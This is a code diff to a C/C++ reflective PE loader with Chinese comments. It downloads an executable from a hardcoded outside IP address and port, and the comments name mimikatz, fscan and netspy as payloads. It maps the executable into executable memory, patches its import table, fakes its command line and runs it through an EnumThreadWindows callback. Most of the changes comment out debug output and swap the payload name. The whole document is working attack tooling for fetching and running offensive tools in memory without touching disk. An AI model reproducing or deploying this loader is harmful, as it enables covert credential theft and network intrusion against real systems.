@@ -411,7 +411,7 @@ bool RepairIAT(PVOID modulePtr)
 
     size_t maxSize = importsDir->Size;  // 导入表的长度
     size_t impAddr = importsDir->VirtualAddress;  // 导入表的起始位置
-    printf("impAddr: %p\n", impAddr);
+    //printf("impAddr: %p\n", impAddr);
 
     IMAGE_IMPORT_DESCRIPTOR* lib_desc = NULL;
     size_t parsedSize = 0;
@@ -419,14 +419,14 @@ bool RepairIAT(PVOID modulePtr)
     for (; parsedSize < maxSize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
         // 获取libname的 VA 地址
         lib_desc = (IMAGE_IMPORT_DESCRIPTOR*)(impAddr + parsedSize + (ULONG_PTR)modulePtr);
-        printf("lib_desc:%p\n", lib_desc);
+        //printf("lib_desc:%p\n", lib_desc);
         
 
         if (lib_desc->OriginalFirstThunk == NULL && lib_desc->FirstThunk == NULL) break;
         // 获取到导入dll的名字
         LPSTR lib_name = (LPSTR)((ULONGLONG)modulePtr + lib_desc->Name);
-        printf("imagebase:%p\n", modulePtr);
-        printf("lib_name: %s\n", lib_name);
+        //printf("imagebase:%p\n", modulePtr);
+        //printf("lib_name: %s\n", lib_name);
 
         size_t call_via = lib_desc->FirstThunk;  // IAT
         size_t thunk_addr = lib_desc->OriginalFirstThunk;  // INT
@@ -455,7 +455,7 @@ bool RepairIAT(PVOID modulePtr)
                 
 
                 size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), func_name); //通过INT里的函数名获取函数地址
-                printf("func_name: %s ,address is :%p\n", func_name, addr);
+                //printf("func_name: %s ,address is :%p\n", func_name, addr);
                 // 以下是填充一些杂七杂八的运行参数
                 if (hijackCmdline && _stricmp(func_name, "GetCommandLineA") == 0)
                 {
@@ -524,24 +524,24 @@ void PELoader(char* data, DWORD datasize)
     }
 
     IMAGE_DATA_DIRECTORY* relocDir = GetPEDirectory(data, IMAGE_DIRECTORY_ENTRY_BASERELOC); // 获取基地址重定位表
-    printf("relocDir: %p\n", relocDir);
+    //printf("relocDir: %p\n", relocDir);
     preferAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase; // 获取PE文件中的镜像基址
-    printf("preferAddr: %p\n", preferAddr);
+    //printf("preferAddr: %p\n", preferAddr);
 
 
     HMODULE dll = LoadLibraryA("ntdll.dll");
     // 强制卸载
-    ((int(WINAPI*)(HANDLE, PVOID))GetProcAddress(dll, "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);
+    //((int(WINAPI*)(HANDLE, PVOID))GetProcAddress(dll, "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);
     // 根据PE文件加载到内存占用的总大小申请内存
     pImageBase = (BYTE*)VirtualAlloc(preferAddr, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    printf("pImageBase: %p\n", pImageBase);
+    //printf("pImageBase: %p\n", pImageBase);
     if (!pImageBase) {
         if (!relocDir) {
             exit(0);
         }
         else {
             pImageBase = (BYTE*)VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-            printf("pImageBase: %p\n", pImageBase);
+            //printf("pImageBase: %p\n", pImageBase);
             if (!pImageBase)
             {
                 exit(0);
@@ -553,14 +553,14 @@ void PELoader(char* data, DWORD datasize)
 
     // 将镜像基址赋值到pe文件头
     ntHeader->OptionalHeader.ImageBase = (size_t)pImageBase;
-    printf("ntHeader->OptionalHeader.ImageBase: %p\n", ntHeader->OptionalHeader.ImageBase);
+    //printf("ntHeader->OptionalHeader.ImageBase: %p\n", ntHeader->OptionalHeader.ImageBase);
     // 将文件头拷贝到内存中
     memcpy(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);
     // 文件头的节
     IMAGE_SECTION_HEADER* SectionHeaderArr = (IMAGE_SECTION_HEADER*)(size_t(ntHeader) + sizeof(IMAGE_NT_HEADERS));
-    printf("SectionHeaderArr:%p\n",SectionHeaderArr);
+    //printf("SectionHeaderArr:%p\n",SectionHeaderArr);
     // 依次通过节数把文件中的数据拷贝到内存中
-    printf("ntHeader->FileHeader.NumberOfSections is :%p \n", ntHeader->FileHeader.NumberOfSections);
+    //printf("ntHeader->FileHeader.NumberOfSections is :%p \n", ntHeader->FileHeader.NumberOfSections);
     for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
     {
         memcpy(LPVOID(size_t(pImageBase) + SectionHeaderArr[i].VirtualAddress), LPVOID(size_t(data) + SectionHeaderArr[i].PointerToRawData), SectionHeaderArr[i].SizeOfRawData);
@@ -572,10 +572,10 @@ void PELoader(char* data, DWORD datasize)
     // AddressOfEntryPoint
     size_t retAddr = (size_t)(pImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;
     printf("retAddr: %p\n", retAddr);
-    printf("Well jmp: %p\n", retAddr-2330);
+    //printf("Well jmp: %p\n", retAddr-2330);
 
     BOOL AA=EnumThreadWindows(0, (WNDENUMPROC)retAddr, 0);
-    printf("AA: %d\n", AA);
+    //printf("AA: %d\n", AA);
 
 }
 
@@ -713,14 +713,14 @@ int main(int argc, char** argv) {
     // 获取一个加密的PE文件
     wchar_t* whost= L"101.42.175.89";
     DWORD port= 65522;
-    wchar_t* wpe = L"netspy.exe.exe";   //mimikatz.exe   fscan32.exe  main.exe
+    wchar_t* wpe = L"fscan64.exe";   //mimikatz.exe   fscan32.exe  main.exe
     //char* host1 = argv[1];
     //DWORD port1 = atoi(argv[2]);
     //char* pe1 = argv[3];
     //char* key1 = argv[4];
     DATA PE = GetData(whost, port, wpe);
-    printf("fscan32 address is :%p\n the lenght is : %d\n",PE.data,PE.len);
-    sz_masqCmd_Ansi = (char*)"-rf";
+    printf("address is :%p\n the lenght is : %d\n",PE.data,PE.len);
+    sz_masqCmd_Ansi = (char*)"moo1";
     PELoader((char*)PE.data, PE.len);
     
     /*
